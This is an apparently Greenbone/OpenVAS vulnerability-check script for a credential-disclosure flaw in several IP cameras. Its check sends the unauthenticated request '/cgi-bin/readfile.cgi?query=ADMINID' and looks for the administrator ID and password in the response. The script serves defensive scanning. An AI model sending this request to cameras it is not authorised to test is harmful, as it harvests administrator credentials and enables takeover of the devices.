if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106212" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2016-08-29 12:52:32 +0700 (Mon, 29 Aug 2016)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Multiple IP-Cameras Information Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "The IP-Camera is prone to an information disclosure vulnerability." );
	script_tag( name: "insight", value: "It is possible for a unauthenticated remote attacker to get the
administrator username and password from this IP-Camera." );
	script_tag( name: "impact", value: "An unauthenticated attacker can receive the administrator username and
its password." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40264/" );
	script_tag( name: "vuldetect", value: "Tries to get the username and password." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
url = "/cgi-bin/readfile.cgi?query=ADMINID";
if(http_vuln_check( port: port, url: url, pattern: "Adm_ID=", check_header: TRUE, extra_check: "Adm_PASS1=" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

